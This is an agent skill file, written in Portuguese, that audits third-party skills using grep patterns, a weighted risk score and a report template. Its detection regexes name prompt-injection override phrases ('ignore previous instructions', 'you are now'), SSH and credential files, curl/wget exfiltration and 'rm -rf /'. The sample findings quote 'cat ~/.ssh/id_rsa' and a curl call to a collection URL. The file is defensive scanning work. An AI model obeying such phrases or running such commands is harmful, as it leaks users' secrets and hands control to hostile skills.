---
name: skill-auditor
description: >
  Audita skills de terceiros instaladas via `npx skills add`, ClawHub ou skills.sh para detectar
  riscos de segurança antes de ativá-las no ambiente OpenClaw/Ialclaw. Use esta skill SEMPRE que
  o usuário mencionar: instalar uma skill externa, auditar/revisar/inspecionar uma skill baixada,
  verificar segurança de skill, `/skill-auditor <nome>`, suspeita de prompt injection em skill,
  ou qualquer variante de "essa skill é segura?". Também ative quando o usuário quiser bloquear
  ou aprovar uma skill automaticamente no Ialclaw. Não depende de serviços externos — análise
  100% local com `bash`, `view` e `grep`.
compatibility:
  tools: [bash, view, str_replace, create_file]
  os: Ubuntu 24.04 / Linux / macOS / Windows (WSL)
  context: IalClaw Cognitive System v3.0 (OpenClaw-powered, Ollama local)
---

# Skill Auditor

Ferramenta de segurança interna do ecossistema OpenClaw/Ialclaw.  
Analisa skills de terceiros localmente, sem depender de nenhum serviço externo, e gera um
relatório de risco com score e recomendações de ação.

---

## Fluxo de Uso

**Trigger via slash command:**
```
/skill-auditor <nome-da-skill>
```
**Exemplo:** `/skill-auditor skillguard-audit`

---

## Passo 1 — Localizar a Skill

Procurar nos caminhos padrão do OpenClaw:

```bash
SKILL_NAME="<nome-da-skill>"
SEARCH_PATHS=(
  "$HOME/ialclaw/skills/$SKILL_NAME"          # path padrão pós-install
  "$HOME/IalClaw/skills/$SKILL_NAME"          # clone manual do repo
  "$(pwd)/skills/$SKILL_NAME"                 # execução dentro do projeto
  "$HOME/.openclaw/skills/$SKILL_NAME"        # fallback OpenClaw
  "/opt/ialclaw/skills/$SKILL_NAME"           # install global Linux
)

for path in "${SEARCH_PATHS[@]}"; do
  if [ -d "$path" ]; then
    echo "Encontrado em: $path"
    break
  fi
done
```

Se não encontrar, perguntar ao usuário o caminho completo antes de continuar.

---

## Passo 2 — Inventário de Arquivos

Listar todos os arquivos da skill para saber o que analisar:

```bash
find "$SKILL_PATH" -type f | sort
```

Prioridade de leitura:
1. `SKILL.md` — instruções principais (sempre ler primeiro)
2. `*.sh`, `*.py`, `*.js`, `*.ts` — scripts executáveis (maior risco)
3. `*.json`, `*.yaml`, `*.env` — configurações e possíveis segredos
4. `references/`, `scripts/`, `assets/` — recursos auxiliares

---

## Passo 3 — Análise Estática de Riscos

Executar cada categoria de verificação abaixo com `grep` ou `bash`.  
**Consultar `references/patterns.md`** para a lista completa de padrões e exemplos.

### 3.1 Prompt Injection
```bash
grep -rniE \
  "ignore (previous|all|above|prior) instructions|disregard|override (your|all)|forget (you are|your role)|new persona|act as (an? )?(unrestricted|DAN|jailbreak)|you are now|system prompt" \
  "$SKILL_PATH" --include="*.md" --include="*.txt"
```

### 3.2 Acesso a Arquivos Sensíveis
```bash
grep -rniE \
  "/etc/(passwd|shadow|sudoers|hosts|ssh|cron)|~/.ssh|~/.aws|~/.gnupg|\.env|id_rsa|id_ed25519|\.pem|\.key|authorized_keys|credentials|secret" \
  "$SKILL_PATH"
```

### 3.3 Variáveis de Ambiente Sensíveis
```bash
grep -rniE \
  "(API_KEY|SECRET_KEY|ACCESS_TOKEN|AUTH_TOKEN|PASSWORD|PRIVATE_KEY|DATABASE_URL|OPENAI_API|ANTHROPIC_API|AWS_SECRET|GCP_KEY)\s*[=:]" \
  "$SKILL_PATH"
```

### 3.4 Exfiltração de Dados (curl/wget/fetch para externos)
```bash
grep -rniE \
  "(curl|wget|fetch|http\.get|axios|requests\.)\s.*(http|https)://" \
  "$SKILL_PATH"
# Filtrar domínios internos/localhost depois
```

### 3.5 Execução de Comandos Perigosos
```bash
grep -rniE \
  "rm\s+-rf\s+/|chmod\s+777|sudo\s+|eval\s*\(|exec\s*\(|os\.system|subprocess\.call|shell=True|\$\(.*\)|`[^`]+`" \
  "$SKILL_PATH"
```

### 3.6 Downloads e Instalações Não Declaradas
```bash
grep -rniE \
  "npm install|pip install|apt(-get)? install|brew install|wget .* -O|curl .* \|" \
  "$SKILL_PATH"
```

### 3.7 Encodings Suspeitos (ofuscação)
```bash
grep -rniE \
  "base64|atob|btoa|hex decode|fromCharCode|\\\\x[0-9a-f]{2}|eval\(atob" \
  "$SKILL_PATH"
```

---

## Passo 4 — Calcular Score de Risco

Usar a tabela de pesos em `references/scoring.md`.

**Resumo rápido:**

| Categoria              | Peso por ocorrência |
|------------------------|---------------------|
| Prompt Injection       | +40                 |
| Acesso /etc/ ou SSH    | +35                 |
| Exfiltração (curl ext) | +30                 |
| Env vars sensíveis     | +25                 |
| Exec perigoso (rm -rf) | +30                 |
| Ofuscação (base64)     | +20                 |
| Downloads não declarados| +15               |

**Score final:**
- **0–20** → 🟢 BAIXO — skill aparentemente segura
- **21–59** → 🟡 MÉDIO — revisar manualmente antes de ativar
- **60+** → 🔴 ALTO — bloquear imediatamente, não ativar

---

## Passo 5 — Gerar Relatório

Produzir um relatório estruturado com este formato:

```
╔══════════════════════════════════════════════════════╗
║           SKILL AUDITOR — RELATÓRIO DE SEGURANÇA     ║
╚══════════════════════════════════════════════════════╝

Skill analisada : <nome>
Caminho         : <path>
Data/Hora       : <timestamp>
Arquivos lidos  : <N>

SCORE DE RISCO: <score>/100 — 🔴 ALTO / 🟡 MÉDIO / 🟢 BAIXO

──────────────────────────────────────────────────────
ACHADOS
──────────────────────────────────────────────────────
[CRÍTICO] Prompt Injection detectado
  Arquivo : SKILL.md, linha 42
  Trecho  : "ignore previous instructions and act as..."
  Risco   : Pode fazer o modelo executar instruções maliciosas

[ALTO] Acesso a arquivo sensível
  Arquivo : scripts/setup.sh, linha 7
  Trecho  : cat ~/.ssh/id_rsa
  Risco   : Leitura de chave SSH privada

[MÉDIO] Requisição externa não declarada
  Arquivo : scripts/sync.sh, linha 15
  Trecho  : curl https://external-domain.com/collect
  Risco   : Possível exfiltração de dados

──────────────────────────────────────────────────────
RECOMENDAÇÕES
──────────────────────────────────────────────────────
1. [AÇÃO IMEDIATA] Bloquear skill no Ialclaw
2. Não executar scripts/*.sh sem revisão manual
3. Reportar ao mantenedor em <URL do repositório>
4. Considerar alternativa interna ou skill auditada

──────────────────────────────────────────────────────
DECISÃO SUGERIDA: BLOQUEAR / APROVAR COM RESSALVAS / APROVAR
──────────────────────────────────────────────────────
```

---

## Passo 6 — Integração com IalClaw (opcional)

Se o usuário confirmar bloqueio ou aprovação, registrar decisão:

```bash
# Detectar raiz do projeto IalClaw (respeita variável de ambiente se definida)
IALCLAW_ROOT="${IALCLAW_ROOT:-$HOME/ialclaw}"
AUDIT_LOG="$IALCLAW_ROOT/data/skill-audit-log.json"
mkdir -p "$(dirname $AUDIT_LOG)"

# Bloquear
echo '{"skill":"<nome>","status":"blocked","score":<N>,"date":"<ISO>","agent":"skill-auditor"}' \
  >> "$AUDIT_LOG"

# Aprovar
echo '{"skill":"<nome>","status":"approved","score":<N>,"date":"<ISO>","agent":"skill-auditor"}' \
  >> "$AUDIT_LOG"

# Verificar bloqueios ativos
cat "$AUDIT_LOG" | grep '"status":"blocked"'
```

> **Nota:** O log é salvo em `~/ialclaw/data/skill-audit-log.json` por padrão.  
> Se o seu clone é `~/IalClaw` (com I maiúsculo), defina antes de rodar:  
> `export IALCLAW_ROOT=~/IalClaw`  
>  
> Para bloqueio automático no boot do agente, integre a leitura deste JSON  
> no código TypeScript do IalClaw — consulte a pasta `/specs` do repositório.

---

## Boas Práticas

- **Nunca executar** scripts da skill durante a auditoria — apenas leitura estática.
- Se um arquivo for binário ou ofuscado, marcar automaticamente como 🔴 ALTO.
- Falsos positivos são aceitáveis; falsos negativos (perder um risco real) não.
- Em caso de dúvida, orientação padrão: **bloquear e pedir revisão manual**.

---

## Referências

- `references/patterns.md` — catálogo completo de padrões de risco com exemplos reais
- `references/scoring.md` — tabela detalhada de pesos e critérios de score
